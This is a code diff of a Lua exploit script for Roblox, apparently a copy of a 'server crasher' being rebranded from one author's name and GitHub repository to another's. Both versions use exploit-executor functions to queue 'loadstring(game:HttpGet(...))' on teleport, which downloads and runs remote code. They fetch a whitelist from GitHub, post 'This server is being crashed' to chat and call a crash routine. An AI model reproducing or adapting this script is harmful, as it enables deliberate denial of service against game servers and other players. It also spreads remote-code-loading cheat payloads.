@@ -1,6 +1,6 @@
 local ont = syn and syn.queue_on_teleport or queue_on_teleport or fluxus and fluxus.queue_on_teleport or function()
     end
-ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/main.lua'),true))()")
+ont("loadstring(game:HttpGet(('https://raw.githubusercontent.com/Kingcurry650/Crash-Script/main/main.lua'),true))()")
  coroutine.wrap(function()
 task.wait(5)
 if not game:IsLoaded() then
@@ -28,14 +28,14 @@ local s, e =
     pcall(
     function()
         function pr(t)
-            print("Kohl Smasher: " .. t .. " Loaded")
+            print("Curry's Server Crasher: " .. t .. " Loaded")
         end
         local gameFlr = game.Workspace:WaitForChild("Terrain"):WaitForChild("_Game")
         local adminFlr = gameFlr.Admin
         local plyrs = game:GetService("Players")
         local rns = game:GetService("RunService")
         local whitelisted =
-            game:HttpGet("https://raw.githubusercontent.com/Korabi-dev/roblox-crasher/main/whitelisted.json")
+            game:HttpGet("https://raw.githubusercontent.com/Kingcurry650/Crash-Script/main/whitelisted.json")
         whitelisted = game:GetService("HttpService"):JSONDecode(whitelisted)
         if not whitelisted then
             whitelisted = {users = {}}
@@ -182,8 +182,8 @@ local s, e =
             pr("Vamp Crash")
         end
 
-        notif("Kohl Smasher", "Loaded.", 5)
-        viewChat("This server is being crashed. Made by Korabi.")
+        notif("Curry's Crash Script", "Loaded.", 5)
+        viewChat("This server is being crashed. Made by Curry.")
         viewChat("I will not stop until this server dies.")
         task.wait(0.1)
         crash()
